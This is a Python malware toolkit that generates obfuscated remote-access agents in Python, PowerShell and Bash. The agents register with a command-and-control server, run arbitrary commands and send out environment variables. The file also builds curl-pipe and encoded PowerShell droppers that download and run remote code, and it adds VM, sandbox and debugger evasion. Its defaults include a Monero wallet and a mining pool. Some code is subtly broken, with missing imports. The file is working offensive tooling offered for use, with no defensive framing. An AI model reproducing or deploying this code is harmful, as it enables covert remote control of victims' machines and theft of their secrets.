#!/usr/bin/env python3
"""
PAYLOAD GENERATOR - Creates obfuscated agents for multiple platforms.
"""

import os
import sys
import json
import base64
import random
import string
import hashlib
import subprocess
from pathlib import Path
from typing import Optional, Dict, List
from datetime import datetime

# Configuration
OUTPUT_DIR = Path(__file__).parent.parent.parent / "generated"
TEMPLATES_DIR = Path(__file__).parent.parent.parent / "static"

class PayloadGenerator:
    """Generate obfuscated payloads for multiple platforms."""
    
    def __init__(self, c2_server: str, wallet: str, pool: str):
        self.c2_server = c2_server
        self.wallet = wallet
        self.pool = pool
        self.output_dir = OUTPUT_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_agent_id(self) -> str:
        """Generate unique agent ID."""
        data = f"{random.random()}-{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:16]
    
    # === OBFUSCATION TECHNIQUES ===
    
    def obfuscate_string(self, s: str) -> str:
        """Obfuscate a string using multiple techniques."""
        techniques = [
            self._obfuscate_base64,
            self._obfuscate_hex,
            self._obfuscate_char_codes,
            self._obfuscate_reverse,
        ]
        return random.choice(techniques)(s)
    
    def _obfuscate_base64(self, s: str) -> str:
        """Base64 encode with decode stub."""
        encoded = base64.b64encode(s.encode()).decode()
        return f"__import__('base64').b64decode('{encoded}').decode()"
    
    def _obfuscate_hex(self, s: str) -> str:
        """Hex encode with decode stub."""
        encoded = s.encode().hex()
        return f"bytes.fromhex('{encoded}').decode()"
    
    def _obfuscate_char_codes(self, s: str) -> str:
        """Convert to character codes."""
        codes = [str(ord(c)) for c in s]
        return f"''.join(chr({c}) for c in {codes})"
    
    def _obfuscate_reverse(self, s: str) -> str:
        """Reverse string."""
        return f"'{s[::-1]}'[::-1]"
    
    def obfuscate_variable_name(self, length: int = 8) -> str:
        """Generate random variable name."""
        prefixes = ["_", "__", "___", "x", "var", "tmp", "data", "buf"]
        chars = string.ascii_lowercase + string.digits
        return random.choice(prefixes) + ''.join(random.choices(chars, k=length))
    
    def obfuscate_code(self, code: str, language: str = "python") -> str:
        """Apply various obfuscation techniques."""
        if language == "python":
            return self._obfuscate_python(code)
        elif language == "powershell":
            return self._obfuscate_powershell(code)
        elif language == "javascript":
            return self._obfuscate_javascript(code)
        return code
    
    def _obfuscate_python(self, code: str) -> str:
        """Obfuscate Python code."""
        # Add junk code
        junk_vars = []
        for _ in range(random.randint(5, 15)):
            var_name = self.obfuscate_variable_name()
            var_value = random.choice([
                f"'{''.join(random.choices(string.ascii_letters, k=20))}'",
                str(random.randint(1000, 9999)),
                f"[{', '.join(str(random.randint(0, 100)) for _ in range(10))}]",
            ])
            junk_vars.append(f"{var_name} = {var_value}")
        
        # Encode strings
        lines = code.split("\n")
        obfuscated_lines = []
        
        for line in lines:
            # Randomize whitespace
            line = line.replace("    ", "  " * random.randint(1, 3))
            
            # Add random comments
            if random.random() < 0.1:
                line += f"  # {random.choice(['TODO', 'FIXME', 'HACK', 'NOTE'])}"
            
            obfuscated_lines.append(line)
        
        # Combine
        result = "\n".join(junk_vars) + "\n\n" + "\n".join(obfuscated_lines)
        
        # Wrap in exec for additional obfuscation
        if random.random() < 0.5:
            encoded = base64.b64encode(result.encode()).decode()
            result = f"exec(__import__('base64').b64decode('{encoded}'))"
        
        return result
    
    def _obfuscate_powershell(self, code: str) -> str:
        """Obfuscate PowerShell code."""
        # Base64 encode
        encoded = base64.b64encode(code.encode('utf-16le')).decode()
        
        # Create obfuscated invocation
        techniques = [
            f"powershell -Enc {encoded}",
            f"powershell -NoP -NonI -W Hidden -Enc {encoded}",
            f"$({encoded} | ForEach-Object {{ [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($_)) }} | IEX)",
        ]
        
        return random.choice(techniques)
    
    def _obfuscate_javascript(self, code: str) -> str:
        """Obfuscate JavaScript code."""
        # Minify
        code = code.replace("\n", " ").replace("\t", "")
        while "  " in code:
            code = code.replace("  ", " ")
        
        # Rename variables
        var_map = {}
        for match in re.finditer(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b', code):
            var_name = match.group(1)
            if var_name not in var_map and var_name not in ['function', 'var', 'let', 'const', 'return', 'if', 'else', 'for', 'while']:
                var_map[var_name] = self.obfuscate_variable_name()
        
        for old, new in var_map.items():
            code = re.sub(r'\b' + old + r'\b', new, code)
        
        # Wrap in eval
        if random.random() < 0.5:
            encoded = base64.b64encode(code.encode()).decode()
            code = f"eval(atob('{encoded}'))"
        
        return code
    
    # === PAYLOAD GENERATION ===
    
    def generate_python_agent(self, obfuscate: bool = True) -> str:
        """Generate Python agent."""
        template = '''#!/usr/bin/env python3
import os,sys,json,time,random,subprocess,socket,hashlib,base64,urllib.request
from pathlib import Path

C2="{c2}";WALLET="{wallet}";POOL="{pool}";AGENT_ID=hashlib.md5(f"{socket.gethostname()}-{time.time()}".encode()).hexdigest()[:16]

def register():
    try:
        d={{"agent_id":AGENT_ID,"hostname":socket.gethostname(),"platform":sys.platform}}
        r=urllib.request.Request(f"{{C2}}/api/agent/register",data=json.dumps(d).encode(),headers={{"Content-Type":"application/json"}},method="POST")
        urllib.request.urlopen(r,timeout=10)
    except:pass

def get_tasks():
    try:
        r=urllib.request.Request(f"{{C2}}/api/agent/tasks?agent_id={{AGENT_ID}}")
        return json.loads(urllib.request.urlopen(r,timeout=10).read()).get("tasks",[])
    except:return[]

def submit_result(tid,res):
    try:
        d={{"agent_id":AGENT_ID,"task_id":tid,"result":res}}
        r=urllib.request.Request(f"{{C2}}/api/agent/result",data=json.dumps(d).encode(),headers={{"Content-Type":"application/json"}},method="POST")
        urllib.request.urlopen(r,timeout=10)
    except:pass

def exec_task(t):
    tid=t.get("id");tp=t.get("task_type");pl=t.get("payload",{{}})
    res={{"status":"completed"}}
    try:
        if tp=="cmd":
            o=subprocess.run(pl.get("cmd",""),shell=True,capture_output=True,text=True)
            res["stdout"]=o.stdout;res["stderr"]=o.stderr
        elif tp=="collect":
            res["data"]={{"env":dict(os.environ),"cwd":os.getcwd()}}
    except Exception as e:res["status"]="failed";res["error"]=str(e)
    submit_result(tid,res)

def main():
    register()
    while True:
        try:
            for t in get_tasks():exec_task(t)
            register()
        except:pass
        time.sleep(random.randint(30,120))

if __name__=="__main__":main()
'''
        
        code = template.format(c2=self.c2_server, wallet=self.wallet, pool=self.pool)
        
        if obfuscate:
            code = self.obfuscate_code(code, "python")
        
        return code
    
    def generate_powershell_agent(self, obfuscate: bool = True) -> str:
        """Generate PowerShell agent."""
        template = '''$C2="{c2}";$WALLET="{wallet}";$POOL="{pool}";$ID=[BitConverter]::ToString([Security.Cryptography.SHA1]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME-$env:USERNAME"))).Replace("-","").Substring(0,16)
function Register-Agent{{try{{$b=@{{agent_id=$ID;hostname=$env:COMPUTERNAME}}|ConvertTo-Json;Invoke-RestMethod -Uri "$C2/api/agent/register" -Method Post -Body $b -ContentType "application/json"}}catch{{}}}}
function Get-Tasks{{try{{return(Invoke-RestMethod -Uri "$C2/api/agent/tasks?agent_id=$ID").tasks}}catch{{return @()}}}}
function Submit-Result{{param($t,$r);try{{$b=@{{agent_id=$ID;task_id=$t;result=$r}}|ConvertTo-Json;Invoke-RestMethod -Uri "$C2/api/agent/result" -Method Post -Body $b -ContentType "application/json"}}catch{{}}}}
Register-Agent;while($true){{try{{Get-Tasks|ForEach-Object{{Submit-Result $_.id @{{status="completed"}}}}}}catch{{}};Start-Sleep -Seconds (Get-Random -Min 30 -Max 120)}}'''
        
        code = template.format(c2=self.c2_server, wallet=self.wallet, pool=self.pool)
        
        if obfuscate:
            code = self.obfuscate_code(code, "powershell")
        
        return code
    
    def generate_bash_agent(self, obfuscate: bool = True) -> str:
        """Generate Bash agent."""
        template = '''#!/bin/bash
C2="{c2}"
WALLET="{wallet}"
POOL="{pool}"
ID=$(hostname | md5sum | cut -c1-16)

register() {{
    curl -s -X POST "$C2/api/agent/register" \
        -H "Content-Type: application/json" \
        -d "{{\\"agent_id\\":\\"$ID\\",\\"hostname\\":\\"$(hostname)\\"}}" >/dev/null
}}

get_tasks() {{
    curl -s "$C2/api/agent/tasks?agent_id=$ID"
}}

main() {{
    register
    while true; do
        tasks=$(get_tasks)
        # Process tasks here
        sleep $((RANDOM % 90 + 30))
    done
}}

main
'''
        
        code = template.format(c2=self.c2_server, wallet=self.wallet, pool=self.pool)
        return code
    
    def generate_dropper(self, target_os: str = "linux") -> str:
        """Generate dropper script."""
        if target_os == "linux":
            return f'''#!/bin/bash
curl -s {self.c2_server}/static/agent.py | python3 &
'''
        elif target_os == "windows":
            encoded = base64.b64encode(f"Invoke-WebRequest -Uri {self.c2_server}/static/agent.ps1 -OutFile $env:TEMP\\agent.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\\agent.ps1".encode('utf-16le')).decode()
            return f"powershell -Enc {encoded}"
        return ""
    
    def generate_all(self, obfuscate: bool = True) -> Dict[str, str]:
        """Generate all payload types."""
        payloads = {
            "python": self.generate_python_agent(obfuscate),
            "powershell": self.generate_powershell_agent(obfuscate),
            "bash": self.generate_bash_agent(obfuscate),
            "dropper_linux": self.generate_dropper("linux"),
            "dropper_windows": self.generate_dropper("windows"),
        }
        
        # Save to files
        for name, code in payloads.items():
            ext = {"python": ".py", "powershell": ".ps1", "bash": ".sh", "dropper_linux": ".sh", "dropper_windows": ".bat"}[name]
            filename = self.output_dir / f"agent_{name}{ext}"
            filename.write_text(code)
            print(f"[+] Generated: {filename}")
        
        return payloads


class AntiAnalysis:
    """Anti-VM, Anti-Sandbox, Anti-Debug techniques."""
    
    @staticmethod
    def check_vm_linux() -> bool:
        """Check if running in VM on Linux."""
        checks = [
            # Check /proc/cpuinfo for hypervisor
            lambda: "hypervisor" in open("/proc/cpuinfo").read(),
            # Check dmesg for virtualization
            lambda: any(x in open("/var/log/dmesg").read() for x in ["VMware", "VBox", "QEMU", "Xen"]),
            # Check MAC addresses (VM vendors)
            lambda: any(x in open("/sys/class/net/*/address").read() for x in ["00:0C:29", "00:50:56", "08:00:27"]),
            # Check for VM tools
            lambda: os.path.exists("/etc/vmware-tools"),
            # Check dmidecode
            lambda: subprocess.run(["dmidecode", "-s", "system-product-name"], capture_output=True).stdout.decode() in ["VMware", "VirtualBox"],
        ]
        
        for check in checks:
            try:
                if check():
                    return True
            except:
                pass
        return False
    
    @staticmethod
    def check_sandbox_linux() -> bool:
        """Check if running in sandbox on Linux."""
        checks = [
            # Check for low resources
            lambda: os.cpu_count() < 2,
            lambda: os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") < 4 * 1024 * 1024 * 1024,  # < 4GB RAM
            # Check for analysis tools
            lambda: subprocess.run(["pgrep", "-f", "wireshark|tcpdump|strace"], capture_output=True).returncode == 0,
            # Check for fake user
            lambda: os.environ.get("USER", "").lower() in ["sandbox", "virus", "malware", "sample"],
            # Check uptime
            lambda: float(open("/proc/uptime").read().split()[0]) < 300,  # < 5 min uptime
        ]
        
        for check in checks:
            try:
                if check():
                    return True
            except:
                pass
        return False
    
    @staticmethod
    def check_debug_linux() -> bool:
        """Check if being debugged on Linux."""
        # Check /proc/self/status for TracerPid
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        return int(line.split()[1]) != 0
        except:
            pass
        return False
    
    @staticmethod
    def evade_linux() -> bool:
        """Run all evasion checks."""
        if AntiAnalysis.check_vm_linux():
            # Delay execution
            time.sleep(random.randint(300, 900))
            return True
        if AntiAnalysis.check_sandbox_linux():
            # Abort or behave normally
            return True
        if AntiAnalysis.check_debug_linux():
            # Exit or mislead
            return True
        return False


# CLI
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Payload Generator")
    parser.add_argument("--c2", default="http://127.0.0.1:5000", help="C2 server URL")
    parser.add_argument("--wallet", default="44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
    parser.add_argument("--pool", default="pool.monero.hashvault.pro:443")
    parser.add_argument("--type", choices=["python", "powershell", "bash", "all"], default="all")
    parser.add_argument("--no-obfuscate", action="store_true")
    
    args = parser.parse_args()
    
    generator = PayloadGenerator(args.c2, args.wallet, args.pool)
    
    if args.type == "all":
        generator.generate_all(obfuscate=not args.no_obfuscate)
    elif args.type == "python":
        print(generator.generate_python_agent(obfuscate=not args.no_obfuscate))
    elif args.type == "powershell":
        print(generator.generate_powershell_agent(obfuscate=not args.no_obfuscate))
    elif args.type == "bash":
        print(generator.generate_bash_agent(obfuscate=not args.no_obfuscate))
